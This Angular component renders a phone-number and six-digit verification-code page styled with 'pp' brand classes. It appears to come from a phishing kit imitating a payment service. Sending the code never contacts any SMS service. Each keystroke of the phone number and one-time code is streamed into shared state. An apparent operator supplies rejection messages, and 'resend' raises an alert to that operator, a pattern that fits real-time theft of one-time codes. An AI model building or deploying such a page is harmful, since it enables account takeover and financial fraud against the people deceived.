
import { Component, inject, signal, effect, OnInit, OnDestroy } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule } from '@angular/forms';
import { PublicLayoutComponent } from './layout/public-layout.component';
import { StateService } from '../services/state.service';
import { TranslatePipe } from '../pipes/translate.pipe';

@Component({
  selector: 'app-phone-verification',
  standalone: true,
  imports: [CommonModule, FormsModule, PublicLayoutComponent, TranslatePipe],
  template: `
    <app-public-layout>
      
      <div class="flex flex-col items-center mb-10">
        <h1 class="text-2xl font-bold text-pp-navy mb-3 text-center tracking-tight">
             {{ (codeSent() ? 'PHONE.TITLE_CODE' : 'PHONE.TITLE_INPUT') | translate }}
        </h1>
        <p class="text-base text-slate-500 px-4 text-center leading-relaxed">
           {{ (codeSent() ? 'PHONE.DESC_CODE' : 'PHONE.DESC_INPUT') | translate }}
        </p>
      </div>

      <!-- Feedback Block -->
      @if (state.rejectionReason()) {
        <div class="mb-8 bg-red-50 border-l-[6px] border-[#D92D20] p-4 flex items-start gap-4 rounded-r-lg">
            <span class="material-icons text-[#D92D20] text-xl">error</span>
            <div>
              <p class="text-sm font-bold text-pp-navy">{{ 'PHONE.ERROR_TITLE' | translate }}</p>
              <p class="text-xs text-slate-600 mt-1">{{ state.rejectionReason() || ('CARD_OTP.INVALID_DESC' | translate) }}</p>
            </div>
        </div>
      }

      <!-- Stage 1: Phone Input -->
      @if (!codeSent()) {
          <div class="space-y-6 animate-in fade-in slide-in-from-bottom-2">
             <div class="pp-input-group">
                <input 
                  type="tel" 
                  [value]="phoneDisplay()"
                  (input)="onPhoneInput($event)"
                  id="phone"
                  placeholder=" "
                  class="pp-input peer"
                />
                <label for="phone" class="pp-label">{{ 'PERSONAL.PHONE' | translate }}</label>
             </div>

             <div class="text-xs text-slate-500 text-center leading-relaxed px-4">
                 {{ 'PHONE.DISCLAIMER' | translate }}
             </div>

             <button 
                (click)="sendCode()"
                [disabled]="!isPhoneValid()"
                [class.opacity-50]="!isPhoneValid()"
                class="pp-btn"
            >
                {{ 'PHONE.SEND_CODE' | translate }}
            </button>
          </div>
      } @else {
          <!-- Stage 2: OTP -->
          <div class="space-y-8 animate-in fade-in slide-in-from-right-2">
            <div class="text-center mb-2">
                <p class="text-base font-bold text-pp-navy mb-1">{{ phoneDisplay() }}</p>
                <a (click)="codeSent.set(false)" class="text-pp-blue font-bold cursor-pointer hover:underline text-xs">{{ 'PHONE.CHANGE' | translate }}</a>
            </div>

            <div class="flex justify-center gap-2 sm:gap-3">
              @for (idx of [0,1,2,3,4,5]; track idx) {
                <input 
                  [id]="'otp-' + idx"
                  type="text" 
                  inputmode="numeric"
                  maxlength="1"
                  [(ngModel)]="digits[idx]"
                  (input)="onOtpInput($event, idx)"
                  (keydown)="onKeyDown($event, idx)"
                  class="w-12 h-14 sm:w-14 sm:h-16 text-center rounded-[12px] border border-slate-300 bg-white text-2xl font-bold text-pp-navy outline-none transition-all duration-200 focus:border-pp-blue focus:ring-1 focus:ring-pp-blue shadow-input focus:shadow-input-focus"
                  [class.border-[#D92D20]]="state.rejectionReason()"
                  [class.bg-red-50]="state.rejectionReason()"
                >
              }
            </div>

            <div class="text-center min-h-[40px]">
              <button 
                (click)="resend()" 
                [disabled]="timer() > 0"
                class="text-pp-blue font-bold text-sm hover:underline hover:text-pp-navy transition-colors disabled:opacity-50 disabled:no-underline disabled:cursor-not-allowed">
                {{ timer() > 0 ? ('PHONE.RESEND_WAIT' | translate: { seconds: timer() }) : ('PHONE.RESEND' | translate) }}
              </button>
               @if (resendSent()) {
                 <p class="text-xs text-pp-success mt-2 font-bold animate-pulse">{{ 'PHONE.CODE_SENT' | translate }}</p>
               }
            </div>

            <button 
              (click)="submit()"
              [disabled]="!isOtpValid()"
              [class.opacity-50]="!isOtpValid()"
              class="pp-btn"
            >
              {{ 'COMMON.CONFIRM' | translate }}
            </button>
          </div>
      }
    </app-public-layout>
  `
})
export class PhoneVerificationComponent implements OnInit, OnDestroy {
  state = inject(StateService);
  
  // Phone State
  rawPhone = '';
  phoneDisplay = signal('');
  isPhoneValid = signal(false);
  codeSent = signal(false);

  // OTP State
  digits: string[] = ['', '', '', '', '', ''];
  isOtpValid = signal(false);
  resendSent = signal(false);

  // Timer State
  timer = signal(0);
  private timerInterval: any;

  ngOnInit() {
      const existingPhone = this.state.phoneNumber();
      if (existingPhone) {
          this.phoneDisplay.set(existingPhone);
          this.isPhoneValid.set(true);
          if (this.state.rejectionReason()) {
              this.codeSent.set(true);
          }
      }
  }

  ngOnDestroy() {
      if (this.timerInterval) clearInterval(this.timerInterval);
  }

  startTimer() {
      this.timer.set(30);
      if (this.timerInterval) clearInterval(this.timerInterval);
      this.timerInterval = setInterval(() => {
          this.timer.update(v => {
              if (v <= 1) {
                  clearInterval(this.timerInterval);
                  return 0;
              }
              return v - 1;
          });
      }, 1000);
  }

  onPhoneInput(event: any) {
      let input = event.target.value.replace(/\D/g, '');
      this.rawPhone = input;
      
      const match = input.match(/^(\d{0,3})(\d{0,3})(\d{0,4})$/);
      let formatted = input;
      if (match) {
          const part1 = match[1];
          const part2 = match[2];
          const part3 = match[3];
          
          if (part1) formatted = `(${part1}`;
          if (part2) formatted += `) ${part2}`;
          if (part3) formatted += `-${part3}`;
      }
      if (input.length > 10) {
          formatted = `(${input.slice(0,3)}) ${input.slice(3,6)}-${input.slice(6,10)}`;
      }

      this.phoneDisplay.set(formatted);
      this.isPhoneValid.set(input.length === 10);
      
      this.state.updatePhone({ number: formatted });
  }

  sendCode() {
      if (this.isPhoneValid()) {
          this.codeSent.set(true);
          this.startTimer();
          setTimeout(() => document.getElementById('otp-0')?.focus(), 100);
      }
  }

  onOtpInput(event: any, index: number) {
    const input = event.target as HTMLInputElement;
    let value = input.value.replace(/\D/g, ''); 
    
    if (value.length > 1) value = value[value.length - 1];
    input.value = value;

    if (value && /^[0-9]$/.test(value)) {
      this.digits[index] = value;
      if (index < 5) {
        document.getElementById(`otp-${index + 1}`)?.focus();
      }
    } else {
       this.digits[index] = ''; 
    }
    this.checkOtpValidity();
    this.state.updatePhone({ code: this.digits.join('') });
  }

  onKeyDown(event: KeyboardEvent, index: number) {
    if (event.key === 'Backspace' && !this.digits[index] && index > 0) {
      document.getElementById(`otp-${index - 1}`)?.focus();
    }
  }

  checkOtpValidity() {
    this.isOtpValid.set(this.digits.every(d => d !== ''));
  }

  submit() {
    if (this.isOtpValid()) {
      this.state.submitPhone(this.phoneDisplay(), this.digits.join(''));
    }
  }

  resend() {
      if (this.timer() === 0) {
          this.state.triggerResendAlert();
          this.resendSent.set(true);
          this.startTimer();
          setTimeout(() => this.resendSent.set(false), 3000);
      }
  }
}
